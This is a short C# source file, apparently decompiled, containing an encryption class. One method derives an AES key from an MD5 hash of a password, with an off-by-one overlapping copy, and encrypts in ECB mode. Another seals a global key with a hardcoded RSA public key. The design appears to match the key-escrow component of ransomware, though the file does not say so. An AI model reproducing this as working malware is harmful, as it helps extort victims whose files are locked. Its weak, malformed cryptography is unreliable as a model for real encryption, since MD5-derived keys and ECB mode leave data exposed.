using System;
using System.Security.Cryptography;
using System.Text;

namespace SF;

internal static class Encryption
{
	public enum KeySizes
	{
		Size2048 = 0x800
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public static string Run()
	{
		byte[] inArray = Encrypt("<RSAKeyValue><Modulus>scxprPZeu5QYOr3mwv5W73kkgG6W32YwwNQwQibt6Pjswg3o0+T6fr6ybLjUpiYpXgLIH3aPIi+nSLF+E1RWkzeVi6s45JaxH36ttCBMxf3BqzuQptp5Ldn9/ngC00P4NWVwmGe++DuUYLUZpz9qD8TCG+Nz8bn++qk6enfRpCIpluIDP8pZANl3sU5zmsb13AOyuuSA4Wb57glNbVQ0fvDpFrMgYUAugpDnTM/u5tWjELBMrmZkinGKWAVV5hnKzozv+FuDBbR6SpKAxa9uayizSbsY20j5zQYAGOhFFu6LLUpV3vJi1cHtD7D9Ex60awQsoPgIvHjApjIpfqqtaw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>", Encoding.UTF8.GetBytes(Main.Key));
		return Convert.ToBase64String(inArray);
	}

	private static byte[] Encrypt(string publicKey, byte[] plain)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(plain, fOAEP: true);
	}
}
